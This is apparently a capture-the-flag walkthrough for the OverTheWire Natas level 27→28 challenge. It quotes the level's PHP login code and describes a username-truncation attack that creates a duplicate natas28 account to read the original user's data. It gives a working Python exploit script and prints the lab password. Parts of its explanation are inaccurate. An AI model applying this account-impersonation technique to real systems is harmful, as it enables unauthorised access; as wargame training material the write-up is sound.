# Level 27 -> Level 28

```
if(array_key_exists("username", $_REQUEST) and array_key_exists("password", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas27', '<censored>');
    mysqli_select_db($link, 'natas27');


    if(validUser($link,$_REQUEST["username"])) {
        //user exists, check creds
        if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){
            echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";
            echo "Here is your data:<br>";
            $data=dumpData($link,$_REQUEST["username"]);
            print htmlentities($data);
        }
        else{
            echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>";
        }
    }
    else {
        //user doesn't exist
        if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){
            echo "User " . htmlentities($_REQUEST["username"]) . " was created!";
        }
    }

    mysqli_close($link);
} 
```

looking at this source code we can see that if a valid user doesn't exist it creates that user so we are about to create duplicate user for natas28 using trailing spaces  
we add the extra trailing spaces to fail the exisiting user check and to create the duplicate user for natas28  
we add too many spaces and a character at end to bypass the checking in the code given below  
the too many spaces would store only natas and its trailing spaces as the character at the end would get stripped away  
and the character at the end would let you bypass the trim() check given below  

```
if($usr != trim($usr)) {
        echo "Go away hacker";
        return False;
}
```

```
function dumpData($link,$usr){

    $user=mysqli_real_escape_string($link, trim($usr));

    $query = "SELECT * from users where username='$user'";
    $res = mysqli_query($link, $query);
    if($res) {
        if(mysqli_num_rows($res) > 0) {
            while ($row = mysqli_fetch_assoc($res)) {
                // thanks to Gobo for reporting this bug!
                //return print_r($row);
                return print_r($row,true);
            }
        }
    }
    return False;
}
```

since this dumpData() uses a while loop to iterate multiple results so the password we create with duplicate natas28 will give us data of original natas28 user  

use this python script to do as said above  

```python
import requests
import re

username = 'natas27'
password = 'u3RRffXjysjgwFU6b9xa23i6prmUsYne'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

r = session.post(url, data = \
	{"username" : "natas28" + "%00"*58+"anything",
	"password"  : "anything"},
	auth = (username, password))

r = session.post(url, data = \
        {"username" : "natas28",
        "password"  : "anything"},
        auth = (username, password))


print(r.text)
```
